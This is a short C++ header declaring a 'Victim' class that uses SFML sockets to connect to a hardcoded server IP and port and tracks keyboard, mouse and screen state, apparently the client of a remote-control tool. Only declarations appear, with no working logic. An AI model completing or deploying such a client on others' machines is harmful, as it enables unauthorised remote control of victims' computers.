#pragma once
#include <SFML/Network.hpp>
#include "Mlib/Util/util.hpp"
#include "Mlib/Io/keyboard.hpp"
#include "Mlib/Io/mouse.hpp"
#include <iostream>

#define SERVER_IP "2.235.241.210"
#define SERVER_PORT 9002

class Victim
{
public:
	Victim();
	int controlVictim();

private:
	void connectServer();

	bool isConnected = false, isRunning = true;
	const Mlib::Vec2i screenSize = Mlib::displaySize();
	sf::TcpSocket server;
	bool keysStates[256];
};